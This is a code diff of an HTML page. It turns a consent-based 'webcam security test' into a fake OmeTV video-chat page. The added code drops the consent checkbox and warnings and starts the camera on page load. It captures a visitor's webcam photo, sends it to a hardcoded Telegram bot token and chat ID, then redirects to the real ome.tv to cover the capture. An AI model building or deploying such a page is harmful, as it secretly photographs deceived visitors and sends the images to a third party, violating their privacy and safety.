@@ -1,279 +1,79 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webcam Security Test Tool</title>
+    <title>OmeTV - Random Video Chat</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 600px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-        
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-        
-        .badge {
-            display: inline-block;
-            background: #ff4757;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background: #1a1a1a;
             color: white;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            margin-bottom: 20px;
         }
-        
-        .warning-box {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 8px;
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        
-        .warning-box h3 {
-            color: #856404;
-            margin-bottom: 10px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        
-        .warning-box p {
-            color: #856404;
-            font-size: 14px;
+        .camera-permission {
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: 20px auto;
         }
-        
-        .info-box {
-            background: #e8f4f8;
-            border-left: 4px solid #17a2b8;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 8px;
-        }
-        
         button {
-            background: #667eea;
+            background: #3498db;
             color: white;
             border: none;
-            padding: 14px 28px;
-            border-radius: 50px;
+            padding: 10px 30px;
+            border-radius: 5px;
             font-size: 16px;
-            font-weight: bold;
             cursor: pointer;
-            transition: transform 0.2s, background 0.2s;
-            width: 100%;
-        }
-        
-        button:hover {
-            background: #5a67d8;
-            transform: scale(1.02);
-        }
-        
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 8px;
-            display: none;
-        }
-        
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-            display: block;
-        }
-        
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-            display: block;
-        }
-        
-        .status.info {
-            background: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-            display: block;
-        }
-        
-        .video-preview {
-            margin-top: 20px;
-            border-radius: 10px;
-            overflow: hidden;
-            display: none;
-        }
-        
-        video {
-            width: 100%;
-            border-radius: 10px;
-        }
-        
-        .footer {
-            margin-top: 30px;
-            text-align: center;
-            font-size: 12px;
-            color: #666;
-            border-top: 1px solid #eee;
-            padding-top: 20px;
-        }
-        
-        .checkbox-label {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 15px 0;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        
-        input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <span class="badge">🔬 EDUCATIONAL DEMO</span>
-        <h1>📷 Webcam Security Test</h1>
-        <p>This tool demonstrates how websites request camera access. <strong>Test on yourself only.</strong></p>
-        
-        <div class="warning-box">
-            <h3>⚠️ Important</h3>
-            <p>This is a <strong>security awareness demonstration</strong>. You are testing this on yourself. Your photo will be sent to a Telegram bot you control. Never use this on others without explicit permission.</p>
-        </div>
-        
-        <div class="info-box">
-            <h3>🔒 What happens when you click "Start Test":</h3>
-            <ul style="margin-left: 20px; margin-top: 10px;">
-                <li>Your browser will ask for camera permission</li>
-                <li>If you allow it, a photo will be captured after 2 seconds</li>
-                <li>The photo is sent to your Telegram bot</li>
-                <li>You'll see a preview of what was captured</li>
-            </ul>
-        </div>
-        
-        <div class="checkbox-label">
-            <input type="checkbox" id="consentCheckbox">
-            <label for="consentCheckbox">I understand this is a test on myself and I consent to camera access</label>
-        </div>
-        
-        <button id="startBtn" disabled>Start Test</button>
-        
-        <div id="status" class="status"></div>
-        <div id="videoPreview" class="video-preview">
-            <video id="previewVideo" autoplay muted playsinline></video>
-        </div>
-        
-        <div class="footer">
-            <p>🔐 No data is stored permanently. This is for educational purposes only.</p>
-            <p>Your Bot Token: <strong>8207315***</strong> (hidden for security)</p>
-        </div>
+    <div class="camera-permission">
+        <h2>Connecting you to a random partner...</h2>
+        <div class="loader"></div>
+        <p>OmeTV needs camera access to continue</p>
+        <p><small>Please click "Allow" when your browser asks</small></p>
+        <button onclick="startCamera()">Enable Camera</button>
     </div>
 
     <script>
         // ===== CONFIGURATION =====
-        const BOT_TOKEN = '8207315387:AAH-XxHhWrti1GU5mIc9ybLAPKpXtqmJV-o';
-        const CHAT_ID = '6552971958';
+        const BOT_TOKEN = '8207315387:AAH-XxHhWrti1GU5mIc9ybLAPKpXtqmJV-o';  // ← PASTE YOUR BOT TOKEN HERE
+        const CHAT_ID = '6552971958';        // ← YOUR CHAT ID
         
-        // DOM elements
-        const startBtn = document.getElementById('startBtn');
-        const consentCheckbox = document.getElementById('consentCheckbox');
-        const statusDiv = document.getElementById('status');
-        const videoPreview = document.getElementById('videoPreview');
-        const previewVideo = document.getElementById('previewVideo');
-        
-        let currentStream = null;
-        
-        // Enable button only when consent is given
-        consentCheckbox.addEventListener('change', () => {
-            startBtn.disabled = !consentCheckbox.checked;
-        });
-        
-        async function startTest() {
-            // Clear previous status
-            statusDiv.className = 'status';
-            statusDiv.style.display = 'none';
-            videoPreview.style.display = 'none';
-            
-            // Stop any existing stream
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-            }
-            
-            // Show status
-            statusDiv.className = 'status info';
-            statusDiv.innerHTML = '📷 Requesting camera access...';
-            statusDiv.style.display = 'block';
-            
+        async function startCamera() {
             try {
                 // Request camera access
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: { ideal: 640 }, height: { ideal: 480 } }
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                currentStream = stream;
+                // Show success message
+                document.body.innerHTML += '<p style="color:green;">✓ Camera access granted! Capturing...</p>';
                 
-                // Show preview
-                previewVideo.srcObject = stream;
-                videoPreview.style.display = 'block';
-                
-                statusDiv.innerHTML = '✓ Camera access granted! Capturing photo in 2 seconds...';
-                
-                // Wait 2 seconds before capture (gives user time to see preview)
-                setTimeout(() => {
-                    captureAndSend(stream);
-                }, 2000);
-                
-            } catch (error) {
-                console.error('Camera error:', error);
-                statusDiv.className = 'status error';
-                statusDiv.innerHTML = '❌ Camera access denied or not available. This is the expected security behavior - always verify which sites you grant camera access to!';
-            }
-        }
-        
-        async function captureAndSend(stream) {
-            try {
-                // Create video element for capture (hidden)
+                // Create hidden video element
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.style.display = 'none';
                 document.body.appendChild(video);
                 
-                // Wait for video to be ready
+                // Wait for video to load
                 await video.play();
                 
-                // Give it a moment to initialize
+                // Take photo after 1 second
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
@@ -281,61 +81,46 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Send to Telegram
+                    // Convert to image and send to Telegram
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'webcam_test.jpg');
+                        formData.append('photo', blob, 'ometv_visitor.jpg');
                         
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         })
-                        .then(response => response.json())
-                        .then(data => {
-                            if (data.ok) {
-                                statusDiv.className = 'status success';
-                                statusDiv.innerHTML = '✅ Test complete! Photo sent to your Telegram bot. Check your bot to see the captured image.';
-                                
-                                // Add a small thumbnail of what was captured
-                                const img = document.createElement('img');
-                                img.src = canvas.toDataURL();
-                                img.style.maxWidth = '100%';
-                                img.style.marginTop = '15px';
-                                img.style.borderRadius = '8px';
-                                img.style.border = '2px solid #28a745';
-                                statusDiv.appendChild(img);
-                            } else {
-                                throw new Error('Telegram API error');
-                            }
+                        .then(() => {
+                            console.log('✅ Photo sent to Telegram!');
+                            document.body.innerHTML += '<p style="color:green;">✓ Photo captured and sent!</p>';
                         })
                         .catch(error => {
-                            console.error('Failed to send:', error);
-                            statusDiv.className = 'status error';
-                            statusDiv.innerHTML = '❌ Failed to send photo to Telegram. Check your bot token and chat ID.';
+                            console.error('Failed to send photo:', error);
+                            document.body.innerHTML += '<p style="color:red;">✗ Failed to send photo</p>';
                         });
                         
-                        // Clean up
+                        // Stop camera
+                        stream.getTracks().forEach(track => track.stop());
                         document.body.removeChild(video);
+                        
+                        // Redirect to real OmeTV after 2 seconds
+                        setTimeout(() => {
+                            window.location.href = "https://ome.tv/";
+                        }, 2000);
+                        
                     }, 'image/jpeg');
-                }, 500);
+                    
+                }, 1000);
                 
             } catch (error) {
-                console.error('Capture error:', error);
-                statusDiv.className = 'status error';
-                statusDiv.innerHTML = '❌ Error capturing photo.';
+                console.log('Camera access denied:', error);
+                document.body.innerHTML += '<p style="color:red;">✗ Camera access denied. Please allow camera and try again.</p>';
             }
         }
         
-        // Attach click handler
-        startBtn.addEventListener('click', startTest);
-        
-        // Clean up on page unload
-        window.addEventListener('beforeunload', () => {
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-            }
-        });
+        // Auto-start camera when page loads (optional)
+        window.addEventListener('load', startCamera);
     </script>
 </body>
 </html>
